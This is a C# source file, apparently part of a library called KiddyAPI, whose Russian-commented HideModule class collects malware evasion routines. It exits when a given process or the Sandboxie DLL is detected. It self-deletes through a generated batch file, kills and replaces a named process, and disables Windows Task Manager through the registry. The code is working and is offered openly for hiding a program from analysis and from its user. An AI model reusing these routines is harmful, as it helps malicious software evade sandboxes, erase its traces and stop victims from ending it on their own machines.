using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace KiddyAPI.Protect
{
    /// <summary>
    /// Доступ к различным методам скрытия/мигрирования программы
    /// </summary>
    class HideModule
    {
        private static bool FindProcess(string name)
        {
            try
            
            {
                var process = Process.GetProcesses();
                foreach (var pr in process)
                {
                    if (pr.ProcessName == name)
                        return true;
                    else
                    {
                        continue;
                    }
                }

                return false;
            }
            catch
            {
                return false;
            }
        }
        /// <summary>
        /// Закрытие программы, если запущен определенный процесс
        /// </summary>
        /// <param name="name">Имя проверяемого процессора</param>
        public static void CheckProcess(string name)
        {
            try
            {
                if (FindProcess(name))
                {
                    Environment.Exit(0);
                }
            }
            catch { }
        }
        /// <summary>
        /// Проверка на подгрузку в процесс dll SandBox
        /// </summary>
        public static void CheckSandBox()
        {
            try
            {
                foreach (string sModul in Process.GetCurrentProcess().Modules)
                {
                    if (sModul.Contains("sbiedll.dll")) { Environment.Exit(0); return; }
                }
            }
            catch { }
        }

        /// <summary>
        /// Автоудаление программы, когда мы захотим
        /// </summary>
        /// <param name="fileName">Имя нашего exe "Example.exe(Полный путь до файла указывать)"</param>
        /// <param name="batName">Имя нашего батника "Example.bat"</param>
        public static void Suicide(string fileName, string batName)
        {
            string _fileName = fileName;
            string _batName = batName;
            string telo = string.Format("@echo off{0}:loop{0}del {1}{0}if exist {1} goto loop{0}del {2}", Environment.NewLine, _fileName, _batName);
            using (StreamWriter strwr = new StreamWriter(_batName, false))
                strwr.Write(telo);
            Process.Start(_batName);
        }

        public static void Replace(string name, string path)
        {
            var process = Process.GetProcesses();
            foreach (var pr in process)
            {
                if (pr.ProcessName == name)
                {
                    pr.Kill();
                    Process.Start(path);
                }
            }


        }

        /// <summary>
        /// Включение/Отключение Диспетчера задач
        /// </summary>
        /// <param name="enable">true - включить, false - выключить</param>
        public static void EnableTaskManager(bool enable)
        {
            Microsoft.Win32.RegistryKey HKCU = Microsoft.Win32.Registry.CurrentUser;
            Microsoft.Win32.RegistryKey key = HKCU.CreateSubKey(
                @"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            key.SetValue("DisableTaskMgr", enable ? 0 : 1,
                Microsoft.Win32.RegistryValueKind.DWord);
        }
    }
}
